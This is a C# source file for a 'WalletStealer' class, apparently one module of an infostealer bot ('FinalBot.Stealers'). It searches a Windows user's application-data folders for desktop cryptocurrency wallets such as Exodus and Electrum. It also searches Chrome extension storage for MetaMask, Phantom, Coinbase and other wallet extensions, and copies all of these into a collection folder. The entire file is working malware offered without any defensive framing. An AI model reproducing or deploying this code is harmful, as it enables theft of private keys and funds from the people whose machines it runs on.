using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;

namespace FinalBot.Stealers
{
    public class WalletStealer
    {
        private readonly string _appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        private readonly string _localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

        private readonly Dictionary<string, string> _walletPaths = new Dictionary<string, string>
        {
            {"Exodus", "Exodus\\exodus.wallet"},
            {"Electrum", "Electrum\\wallets"},
            {"Coinomi", "Coinomi\\Coinomi\\wallets"},
            {"Atomic", "atomic\\Local Storage\\leveldb"},
            {"Guarda", "Guarda\\Local Storage\\leveldb"},
            {"Jaxx", "com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb"}
        };

        private readonly Dictionary<string, string> _extensionPaths = new Dictionary<string, string>
        {
            {"Metamask", "nkbihfbeogaeaoehlefnkodbefgpgknn"},
            {"Phantom", "bfnaoomekhehdbephnjmmcptobbiogee"},
            {"Binance", "fhbohhlidocbacedohohjccennooocaa"},
            {"Coinbase", "hnfanknocfeofbddgcijnmhnfnkdnoad"},
            {"Trust Wallet", "egjidjbpgmcnihkmyhgneha bidpmoad"}
        };

        public async Task<string> Run(string outputDir)
        {
            string destPath = Path.Combine(outputDir, "Wallets");
            Directory.CreateDirectory(destPath);

            int count = 0;

            // 1. Software Wallets
            foreach (var wallet in _walletPaths)
            {
                string fullPath = Path.Combine(_appData, wallet.Value);
                if (Directory.Exists(fullPath) || File.Exists(fullPath))
                {
                    string target = Path.Combine(destPath, wallet.Key);
                    if (File.Exists(fullPath))
                    {
                        Directory.CreateDirectory(Path.GetDirectoryName(target));
                        File.Copy(fullPath, target, true);
                    }
                    else 
                    {
                        CopyDirectory(fullPath, target);
                    }
                    count++;
                }
            }

            // 2. Browser Extensions (Chrome Example)
            string chromeExtPath = Path.Combine(_localAppData, "Google\\Chrome\\User Data\\Default\\Local Extension Settings");
            if (Directory.Exists(chromeExtPath))
            {
                foreach (var ext in _extensionPaths)
                {
                    string fullPath = Path.Combine(chromeExtPath, ext.Value);
                    if (Directory.Exists(fullPath))
                    {
                        CopyDirectory(fullPath, Path.Combine(destPath, "Extensions", ext.Key));
                        count++;
                    }
                }
            }

            return count > 0 ? $"✅ Found {count} crypto-related items." : "❌ No wallets found.";
        }

        private void CopyDirectory(string sourceDir, string destDir)
        {
            Directory.CreateDirectory(destDir);
            foreach (var file in Directory.GetFiles(sourceDir))
            {
                File.Copy(file, Path.Combine(destDir, Path.GetFileName(file)), true);
            }
            foreach (var subDir in Directory.GetDirectories(sourceDir))
            {
                CopyDirectory(subDir, Path.Combine(destDir, Path.GetFileName(subDir)));
            }
        }
    }
}
